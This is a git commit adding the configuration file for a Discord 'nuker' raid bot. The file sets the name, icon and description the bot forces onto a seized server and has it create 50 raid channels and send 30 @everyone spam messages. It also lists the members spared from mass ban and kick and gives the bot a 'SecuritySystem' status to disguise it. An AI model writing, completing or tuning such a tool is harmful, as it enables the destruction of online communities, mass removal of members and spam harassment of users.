8a6aa2e4dc29855a3538171106aa494b9e44c921
giorpro1322 <137407898+giorpro1322@users.noreply.github.com>
2024-05-09 22:15:36 +0400

    Add files via upload

---
+++ config.py
@@ -0,0 +1,42 @@
+SERVER_CONFIG = {
+    "new_name": "☢️ NUKER BY PS99 SCRIPT ☢️",  # New Server Name here      
+    "new_icon": "https://pbs.twimg.com/media/GARsLJzWIAAuioX.jpg:large",   # New Server Icon url here → https://yourimage.jpg    
+    "new_description": "HAHA",  # New Server Description here    
+}
+
+WEBHOOK_CONFIG = {
+    "default_name": "☢️ NUKE BY PS99 SCRIPT ☢️",  # Webhook Name here     
+}
+
+
+AUTO_RAID_CONFIG = {
+    'num_channels': 50,  # Number of channels/ better max 50    
+    'channel_type': 'text',  # text/voice     
+    'channel_name': '☢️ NUKE BY PS99 SCRIPT ☢️',  # Channel name      
+    'num_messages': 30,  # Number of message to spam/better max 30     
+    'message_content': '@everyone @here NUKE SERVER BY PS99 SCRIPT TOOLS JOIN SERVER ' # Spam Message     
+}
+
+NO_BAN_KICK_ID = {
+    000000000000,       # Put Whitelist ID
+    111111111111,       # No Ban & No Kick
+    222222222222,
+}
+
+BOT_PRESENCE = {
+    "type": "playing",  # "playing", "listening", or "watching"
+    "text": "SecuritySystem"  # you status like playing SecuriySystem
+}
+
+EMBED_CONFIG = {
+    "title": "BY PS99 SCRIPT",    # Maine Embed Title here you can change it :3          
+    "description": "PS99 SCRIPT NUKER BY",   # Main Embed Description here/ description of the discord server           
+    "color": 0xFF5733,   # Change embed color if you want (red) is 0xFF5733        
+    "fields": [
+        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},     
+        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},
+        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False      
+    ],
+    "image": "https://pbs.twimg.com/media/GARsLJzWIAAuioX.jpg:large",   # Embed Icon url here → https://yourimage.com     
+    "footer": "☢️ NUKER BY PS99 SCRIPT ☢️",  # Embed Footer here/ just a text     
+}
